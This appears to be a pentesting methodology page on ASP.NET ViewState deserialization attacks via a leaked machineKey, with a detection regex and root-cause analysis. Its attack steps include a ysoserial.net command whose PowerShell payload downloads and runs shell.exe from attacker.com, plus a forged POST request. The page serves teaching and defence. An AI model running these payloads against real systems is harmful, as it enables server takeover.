...
#### Remote Code Execution via Cryptographic Key Re-Use and ObjectStateFormatter Polymorphism

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise portals built on older, monolithic .NET Framework architectures (ASP.NET Web Forms) identified by `.aspx` endpoints and the presence of massive `__VIEWSTATE` hidden input fields in the HTML responses
{% endstep %}
...
{% step %}
Decompile or reverse engineer the application's global configuration (`web.config`), specifically hunting for the `<machineKey>` node, or inspect the CI/CD pipeline variables (e.g., Azure DevOps, GitHub Actions) used to deploy the web farm
{% endstep %}

{% step %}
Identify the "Client-Side State Tracking" architecture. To maintain state across stateless HTTP requests without exhausting server memory, ASP.NET Web Forms serializes the entire state of the page's UI controls into a binary format, Base64-encodes it, and sends it to the client inside the `__VIEWSTATE` parameter. When the client submits a form (PostBack), the server deserializes this payload to restore the UI state
{% endstep %}

{% step %}
Investigate the Cryptographic Integrity boundary. To prevent attackers from modifying the ViewState, ASP.NET appends a Message Authentication Code (MAC) to the payload. This MAC is generated using the server's `machineKey`. If a web farm (multiple load-balanced servers) is used, all servers must share the exact same static `machineKey` to ensure ViewState payloads generated by Server A can be validated by Server B
{% endstep %}

{% step %}
Analyze the Deserialization Execution Context. The ASP.NET engine natively uses `ObjectStateFormatter` or `LosFormatter` to deserialize the ViewState. These formatters are notoriously polymorphic; they will instantiate _any_ class defined in the payload before executing type-checking against the expected UI controls
{% endstep %}

{% step %}
Discover the fatal perimeter collapse: The development team securely enforces `enableViewStateMac="true"`. However, because they deployed a web farm, they generated a static `<machineKey>` and hardcoded it into the `web.config` file. Over the years, this `web.config` was pushed to a public GitHub repository, or the key was reused across Development, Staging, and Production environments
{% endstep %}

{% step %}
Understand the vulnerability: The attacker does not need to bypass the MAC validation logic; they simply need to forge a mathematically valid MAC. Because the cryptographic secret (the `machineKey`) is compromised through infrastructural key re-use or source-code leakage, the attacker possesses the absolute authority to mint authentic ViewState payloads
{% endstep %}

{% step %}
Formulate the Deserialization RCE payload. Utilize a tool like `ysoserial.net` to generate a malicious serialized gadget chain (e.g., `TypeConfuseDelegate`, `TextFormattingRunProperties`, or `ActivitySurrogateSelector`)
{% endstep %}

{% step %}
The gadget chain is designed to execute a native OS command (e.g., `cmd.exe /c whoami > C:\inetpub\wwwroot\shell.txt`) upon instantiation
{% endstep %}

{% step %}
Sign the malicious payload using the extracted `machineKey` (requiring the `validationKey`, `decryptionKey`, `validation` algorithm, and `decryption` algorithm). ASP.NET requires precise matching of the application path and generation algorithms to forge the signature correctly
{% endstep %}

{% step %}
Base64-encode the signed payload to match the standard `__VIEWSTATE` format
{% endstep %}

{% step %}
Intercept a legitimate `POST` request (PostBack) to any `.aspx` page on the target server
{% endstep %}

{% step %}
Replace the legitimate `__VIEWSTATE` value with the forged, signed payload
{% endstep %}

{% step %}
Transmit the request. The ASP.NET engine extracts the payload. It recalculates the MAC using its internal `machineKey`. The hashes match perfectly. The engine forwards the payload to `ObjectStateFormatter`. The formatter deserializes the payload, blindly instantiating the attacker's polymorphic gadget chain. The gadget executes the embedded OS command, granting the attacker unauthenticated Remote Code Execution (RCE) via flawless cryptographic forgery
...
{% tab title="C#" %}
```regexp
(<machineKey\s+validationKey=['"][^'"]+['"]\s*decryptionKey=)|(enableViewStateMac\s*=\s*['"]false['"])|(ViewStateEncryptionMode\s*=\s*['"]Never['"])
```
{% endtab %}
{% endtabs %}
...
```xml
<!-- web.config - Infrastructural Misconfiguration -->
...
<configuration>
  <system.web>
    <!-- [1] -->
    <!-- [2] -->
    <!-- The framework relies on client-side state tracking -->
    <pages enableViewState="true" enableViewStateMac="true" viewStateEncryptionMode="Always" />
    
    <!-- [3] -->
    <!-- [4] -->
    <!-- Fatal Flaw: The machineKey is hardcoded to support web-farm synchronization. 
         If this configuration file is leaked via a Directory Traversal, an LFI, an exposed 
         GitHub repository, or if the same key is utilized in a lower-tier QA environment, 
         the cryptographic integrity of the entire production platform is compromised. -->
    <machineKey 
...
public partial class UserDashboard : System.Web.UI.Page
{
    ...
    {
        // The developer writes standard UI logic, entirely unaware that the 
        // underlying Page lifecycle implicitly routes the untrusted __VIEWSTATE 
        // HTTP parameter into a highly dangerous deserialization sink (ObjectStateFormatter) 
        // prior to this Page_Load event ever firing.
        if (IsPostBack)
        {
...
{% step %}
\[1] The architecture handles complex, stateful multi-step forms by offloading the state memory to the client's browser, transmitting it back and forth during HTTP PostBacks, \[2] To secure this transport, ASP.NET natively applies a cryptographic signature (MAC) to the payload, ensuring the state cannot be tampered with by the client, \[3] To support load-balanced environments (web farms), engineers override the framework's auto-generated, ephemeral cryptographic keys with static, hardcoded keys synchronized across all servers, \[4] The execution sink. The ASP.NET deserialization engine (`ObjectStateFormatter`) is inherently unsafe; it evaluates and instantiates arbitrary classes by design. Its sole protection is the cryptographic MAC signature. Developers treated the `machineKey` as a configuration artifact rather than a critical master credential. By inadvertently leaking this key (via source control, shared environments, or misconfigured backups), they handed the attacker the signing authority. The attacker exploits this by crafting a serialized execution payload (using known .NET gadget chains) and signing it with the stolen key. The framework, trusting the mathematically perfect signature, blindly routes the payload into the polymorphic deserializer, instantly converting a cryptographic key-management failure into a devastating Remote Code Execution vulnerability

```http
// 1. Attacker discovers the target runs ASP.NET Web Forms.
// 2. Attacker successfully extracts the web.config via a previous Local File Inclusion (LFI) 
//    or discovers the exact machineKey in a public GitHub commit.

// 3. Attacker uses ysoserial.net to generate a malicious ViewState payload:
//    ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell.exe -c Invoke-WebRequest -Uri http://attacker.com/shell.exe -OutFile C:\shell.exe; C:\shell.exe" --generator="CA0B0334" --validationalg="SHA1" --validationkey="C50B3C89..."

// 4. ysoserial.net outputs a massive, Base64-encoded string containing the signed payload.

// 5. Attacker executes a standard POST request to any valid .aspx page on the server.
POST /dashboard.aspx HTTP/1.1
Host: web.enterprise.tld
Content-Type: application/x-www-form-urlencoded

// 6. The attacker injects the forged payload into the __VIEWSTATE parameter.
__VIEWSTATE=/wEPDwUJMzE4NTY4MDE2D...[FORGED_SERIALIZED_GADGET_CHAIN]...&btnSubmit=Save

// 7. The ASP.NET HTTP Module intercepts the request before routing it to the application logic.
// 8. The framework extracts the MAC from the payload and recalculates it using the internal machineKey.
// 9. The hashes match. The framework deems the payload "Trusted".
// 10. The framework passes the payload to ObjectStateFormatter.Deserialize().
// 11. The formatter instantiates the TypeConfuseDelegate gadget.
// 12. The gadget evaluates its internal execution chain, launching PowerShell on the host OS.
```
{% endstep %}

{% step %}
To manage UI state within stateless HTTP protocols across distributed web farms, architects deployed a serialized, client-side memory cache protected by a static, globally synchronized cryptographic signature (`machineKey`). This architecture tightly coupled platform security to the absolute secrecy of a single configuration string. The vulnerability emerged from a catastrophic breakdown in cryptographic key lifecycle management combined with intrinsically unsafe framework parsing mechanics. By treating the master `machineKey` as standard configuration data, it was exposed to lateral leakage (e.g., source control commits, shared Dev/Prod environments). The attacker weaponized this leaked key to bypass the framework's primary defense mechanism. Producing a mathematically flawless signature, the attacker smuggled a polymorphic, serialized gadget chain past the cryptographic perimeter and directly into the un-sandboxed `ObjectStateFormatter`. The framework, blindly trusting the authenticated signature, deserialized the hostile object graph, triggering immediate, unauthenticated Remote Code Execution and entirely compromising the underlying operating system
{% endstep %}
{% endstepper %}
